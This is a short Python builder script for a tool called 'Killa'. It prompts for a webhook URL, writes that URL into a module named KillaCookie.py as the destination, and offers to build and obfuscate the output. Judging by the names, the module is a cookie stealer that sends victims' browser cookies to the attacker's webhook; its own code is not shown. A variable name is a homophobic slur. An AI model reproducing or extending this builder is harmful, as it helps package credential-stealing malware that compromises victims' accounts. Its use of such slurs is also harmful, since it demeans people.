import os
import sys
import time

from colorama import Fore

from utils.banner import Text
from utils.build import build

class main:
    
    def __init__(self):
        
        os.system('cls && mode 150,35')
        Text()
        self.choices()
    
    def print015(self,text):
        for c in text:
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.030)
        sys.stdout.write("\n")
    
    def choices(self):
        
        self.print015(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.WHITE} -> Please enter your webhook')
        webhook = input(f'{Fore.MAGENTA}> ')
        code = f'''

FUCKINGFAGGOT = '{webhook}'
if __name__ == '__main__':
    KillaCookie(FUCKINGFAGGOT)
'''
        
        with open('utils/KillaCookie.py','a') as f:
            f.write(code)
        self.print015(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.GREEN} + File Wrote Webhook')
        
        self.print015(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.WHITE} -> Do u want to build ? (Y OR N)')
        buildc = input(f'{Fore.MAGENTA}> ')
        yes = ['y','Y','yes','yeah','yea','sure','mhm']
        if buildc in yes:
            self.print015(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.WHITE} -> Do u want to obfuscate ? (Y or N)')
            obfuscate = input(f'{Fore.MAGENTA}> ')
            if obfuscate in yes:
                build('yes')
            else:
                build('no')
        else:
            self.print015(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.GREEN} + File built !')
            input(f'{Fore.MAGENTA}[{Fore.RED}Killa{Fore.MAGENTA}] {Fore.WHITE} -> Press enter to exit')

if __name__ == "__main__":
    main()        